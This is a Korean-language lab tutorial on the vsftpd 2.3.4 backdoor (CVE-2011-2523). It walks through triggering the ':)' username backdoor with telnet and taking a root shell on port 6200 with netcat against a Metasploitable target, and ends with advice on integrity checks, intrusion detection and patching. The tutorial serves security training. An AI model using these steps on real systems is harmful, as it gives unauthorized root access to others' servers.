Cyber Security Lab CVE-2011-2523 | Exploitation

vsftpd 2.3.4 Backdoor
커맨드 실행 및 세션 관리 실무

CRITICAL : 10.0

System Architect Pro

1. 취약점 메커니즘 (Vulnerability Mechanism)

본 취약점은 공급망 공격 (Supply Chain Attack, 소프트웨어 제작 및 배포 인프라를 침해하여 소스코드에 악성 기능을 삽입하는 공격)의 대표적 사례입니다. 공격자가 FTP(File Transfer Protocol, 파일 전송 프로토콜) 서비스의 계정명에 특정 문자열을 전송하면, 서버의 커널 레벨에서 백도어 포트를 개방하는 원리입니다.

[도식: 백도어 트리거 및 리버스 쉘 연결 아키텍처]

공격자 (Attacker)
USER anyuser:)
Port 21 (FTP)
BACKDOOR TRIGGERED
타겟 (Target)
vsftpd 2.3.4
Port 6200 OPEN
루트 쉘 (Root Shell)
Interactive Access
트리거 조건 (Condition)

계정명(USER) 끝에 :) 문자를 포함하여 전송하면 서버 내부의 vsf_sysutil_extra() 함수가 호출되며, 즉시 6200/TCP 포트가 바인딩(Binding, 네트워크 포트 할당)됩니다.

공격 영향 (Impact)

별도의 패스워드 인증 없이 6200번 포트로 접속하는 모든 사용자에게 root 권한의 인터랙티브 쉘(Interactive Shell, 대화형 명령어 입력 환경)이 제공됩니다.

2. 실습 환경 구성 (Environment Setup)

Attacker

공격자 노드

Kali Linux v2024.x

  • IP Address: 192.168.50.10
  • Tools: MSF, Nmap, Telnet, Netcat
Target

타겟 인프라

Metasploitable 2

  • IP Address: 192.168.50.100
  • Service: vsftpd v2.3.4 (Port 21)

Cloud Infrastructure Security Warning

AWS EC2(Elastic Compute Cloud, 아마존 탄력적 컴퓨팅) 환경에서 실습 시, 보안 그룹(Security Group)의 인바운드 규칙에서 21/TCP 및 6200/TCP 포트를 0.0.0.0/0(Anywhere)으로 개방하는 행위는 매우 위험합니다. 전 세계 스캔 봇에 의해 시스템이 장악되어 크립토 마이닝(Crypto Mining, 암호화폐 채굴) 등에 악용될 수 있으므로 반드시 본인의 공인 IP로만 접근을 제한하십시오.

3. 수동 공격 및 세션 관리 (Manual Exploitation & Session Control)

자동화 도구(Metasploit) 없이도 리눅스 기본 유틸리티인 Telnet(텔넷) 또는 Netcat(넷캣)을 사용하여 취약점을 수동으로 트리거하고, 획득한 세션을 안전하게 종료하는 절차를 실습합니다.

1

백도어 서비스 발동 (Triggering)

FTP 21번 포트에 접속하여 특수 계정명 :)를 전송합니다.

Terminal 1
# Telnet을 이용한 21번 포트 접속
$ telnet 192.168.50.100 21
Connected to 192.168.50.100.
220 (vsFTPd 2.3.4)
$ USER hello:)
331 Please specify the password.
$ PASS secret
※ 위 터미널은 연결을 유지(Hang)한 상태로 새 터미널을 엽니다.
2

백도어 쉘 접속 (Exploitation)

트리거된 6200번 포트로 접속하여 루트 권한을 획득합니다.

Terminal 2
# 새 포트로 접속하여 명령어 실행
$ nc -v 192.168.50.100 6200
Connection to 192.168.50.100 6200 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
3

세션 종료 및 백도어 제거 (Termination)

공격 행적을 지우거나 백도어 프로세스를 중단시키기 위해 세션을 안전하게 종료합니다.

# 1. 원격지에서 백도어 프로세스(vsftpd) 식별 및 종료
$ ps -ef | grep vsftpd
root 4521 1 0 05:30 ? 00:00:00 vsftpd (backdoor)
$ kill -9 4521 (※ PID는 가변적입니다)
# 2. 로컬 쉘 세션 탈출
$ exit 또는 Ctrl + C
Connection closed by foreign host.
전문가 조언: 실제 사고 분석 시에는 프로세스를 단순히 kill 하기보다, lsof -i :6200 명령어를 통해 해당 포트를 점유 중인 프로세스의 상세 정보를 로깅(Logging)하여 증거를 확보하는 것이 선행되어야 합니다.

4. 아키텍트 인사이트 및 보안 대책

무결성 검증 (Integrity Check)

오픈소스 소프트웨어를 인프라에 도입할 때, 공식 배포처에서 제공하는 해시값(Hash Value, SHA-256 등)을 기반으로 바이너리의 변조 여부를 반드시 검증해야 합니다. CI/CD(지속적 통합/배포) 파이프라인에 보안 스캐닝 단계를 통합하는 DevSecOps 아키텍처가 필수적입니다.

심층 방어 (Defense in Depth)

서비스에 필요한 21번 포트 외에, 6200번과 같이 승인되지 않은 비정상 포트가 활성화되는 행위를 IDS/IPS(침입 탐지/차단 시스템)가 실시간으로 차단해야 합니다. 네트워크 분리(Segmentation)를 통해 관리망과 서비스망을 철저히 격리하십시오.

패치 관리 정책 (Patching)

운영 시스템의 패키지 버전을 주기적으로 스캔하고, 취약점이 보고된 버전은 즉시 업데이트 및 업그레이드(Update & Upgrade)해야 합니다. 가급적 취약점이 검증된 최신 LTS(Long Term Support, 장기 지원) 버전의 OS를 사용하십시오.
